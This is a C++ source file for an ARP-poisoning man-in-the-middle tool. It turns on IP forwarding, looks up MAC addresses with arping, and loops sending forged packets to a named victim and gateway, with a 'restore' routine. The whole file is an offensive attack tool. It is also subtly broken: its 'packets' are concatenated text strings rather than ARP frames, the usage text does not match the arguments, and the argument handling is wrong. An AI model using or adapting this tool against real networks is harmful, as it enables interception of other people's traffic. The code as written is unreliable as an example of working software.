#include <iostream>
#include <string>
#include <vector>
#include <cstring>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/if_ether.h>
#include <pcap.h>

#define SNAP_LEN 1518

using namespace std;

void help_text() {
    cout << "\nUsage:\n ./hd_tcp_syn network_range\n" << endl;
    exit(1);
}

void enable_ip_forwarding() {
    cout << "\n[*] Enabling IP Forwarding...\n" << endl;
    system("echo 1 > /proc/sys/net/ipv4/ip_forward");
}

void disable_ip_forwarding() {
    cout << "[*] Disabling IP Forwarding..." << endl;
    system("echo 0 > /proc/sys/net/ipv4/ip_forward");
}

string get_mac(string IP) {
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live("eth0", SNAP_LEN, 1, 1000, errbuf);
    if (handle == NULL) {
        cout << "Error opening interface: " << errbuf << endl;
        exit(1);
    }
    struct pcap_pkthdr header;
    const u_char* packet;
    string macAddress;
    string command = "arping -c 1 " + IP + " | grep reply | awk '{print $4}'";
    FILE* stream = popen(command.c_str(), "r");
    if (stream) {
        char buffer[1024];
        while (!feof(stream)) {
            if (fgets(buffer, sizeof(buffer), stream) != NULL) {
                macAddress += buffer;
            }
        }
        pclose(stream);
    }
    return macAddress;
}

void reARP(string victimIP, string gatewayIP) {
    cout << "\n[*] Restoring Targets..." << endl;
    string victimMAC = get_mac(victimIP);
    string gatewayMAC = get_mac(gatewayIP);

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live("eth0", SNAP_LEN, 1, 1000, errbuf);
    if (handle == NULL) {
        cout << "Error opening interface: " << errbuf << endl;
        exit(1);
    }

    string packetData = "";
    packetData += victimMAC;
    packetData += victimIP;
    packetData += gatewayMAC;
    packetData += gatewayIP;
    u_char packet[packetData.length()];

    strncpy((char*)packet, packetData.c_str(), packetData.length());

    for (int i = 0; i < 7; i++) {
        pcap_sendpacket(handle, packet, sizeof(packet));
    }
    disable_ip_forwarding();
    cout << "[*] Shutting Down..." << endl;
    exit(1);
}

void trick(string gm, string vm, string victimIP, string gatewayIP) {
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live("eth0", SNAP_LEN, 1, 1000, errbuf);
    if (handle == NULL) {
        cout << "Error opening interface: " << errbuf << endl;
        exit(1);
    }

    string packetData = "";
    packetData += vm;
    packetData += victimIP;
    packetData += gm;
    packetData += gatewayIP;
    u_char packet[packetData.length()];

    strncpy((char*)packet, packetData.c_str(), packetData.length());

    pcap_sendpacket(handle, packet, sizeof(packet));
}

void mitm(string victimIP, string gatewayIP) {
    string victimMAC;
    try {
        victimMAC = get_mac(victimIP);
    } catch (exception& e) {
        disable_ip_forwarding();
        cout << "[!] Couldn't Find Victim MAC Address" << endl;
        cout << "[!] Exiting..." << endl;
        exit(1);
    }

    string gatewayMAC;
    try {
        gatewayMAC = get_mac(gatewayIP);
    } catch (exception& e) {
        disable_ip_forwarding();
        cout << "[!] Couldn't Find Gateway MAC Address" << endl;
        cout << "[!] Exiting..." << endl;
        exit(1);
    }

    cout << "[*] Poisoning Targets..." << endl;
    while (true) {
        try {
            trick(gatewayMAC, victimMAC, victimIP, gatewayIP);
            sleep(1.5);
        } catch (exception& e) {
            reARP(victimIP, gatewayIP);
            break;
        }
    }
}


int main(int argc, char* argv[]) {
    if (argc < 2) {
        help_text();
    }
    string interface = argv[1];
    string victimIP = argv[2];
    string gatewayIP = argv[3];
    enable_ip_forwarding();
    mitm(victimIP, gatewayIP);
    return 0;
}
